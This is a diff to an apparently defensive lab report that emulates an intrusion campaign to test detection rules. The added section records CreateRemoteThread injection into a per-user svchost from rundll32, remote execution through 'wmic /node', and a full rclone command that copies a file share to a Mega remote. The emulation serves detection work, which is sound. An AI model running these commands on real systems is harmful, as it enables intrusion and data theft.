@@ -298,3 +298,37 @@ Three rules dominate the volume: service host egress (168), LSASS access (59) an
   falling back to `Get-SmbShare`, and records three shares in this lab.
 - `rundll32 <dll>,DllRegisterServer` through `wmic process call create` returns `9` on this build, so
   the pivot keeps the space-separated form. The comma form works when the loader is started directly.
+
+## Resolution of the two remaining deviations (2026-10-25)
+
+Both deviations recorded in the run above were removed.
+
+**Per-user service host instead of a custom group.** The first injection into a service host used a
+service created for the lab (`svchost.exe -k c0015grp -p`). With an RDP session open for the victim,
+Windows starts `svchost.exe -k UnistackSvcGroup` for the per-user services, and the injector was
+pointed at that process instead:
+
+```
+svchost.exe -k UnistackSvcGroup   (3756, duc.user)
+  <- CreateRemoteThread from rundll32.exe
+session 69c21fd9 hosted by svchost 3756
+```
+
+No service is installed for this step any more. The service host belongs to the operating system and
+exists because a user is logged on, which is the shape the campaign produces.
+
+**Exfiltration through the share as the user.** A SYSTEM process cannot read its own host's share over
+the loopback, so the transfer moved to the victim context. With `duc.user` holding read on the share,
+the beacon hosted by the service host ran:
+
+```
+C:\Tools\rclone.exe --config C:\Tools\rclone.conf copy --max-age 2y "\\FS01\Shares" Mega:DATA
+  -q --ignore-existing --auto-confirm --multi-thread-streams 7 --transfers 7 --bwlimit 10M
+```
+
+The command line now carries `\\FS01\Shares` and the account is `duc.user`, as in the campaign. The
+transfer added 32 objects, taking the remote to 100 objects.
+
+**Comma syntax.** `rundll32 <dll>,DllRegisterServer` works when the loader is started directly, but
+`wmic /node:FS01 process call create "rundll32 ... ,DllRegisterServer"` returns `9`
+(`Invalid arguments`) on this build. The pivot therefore keeps the space-separated form.
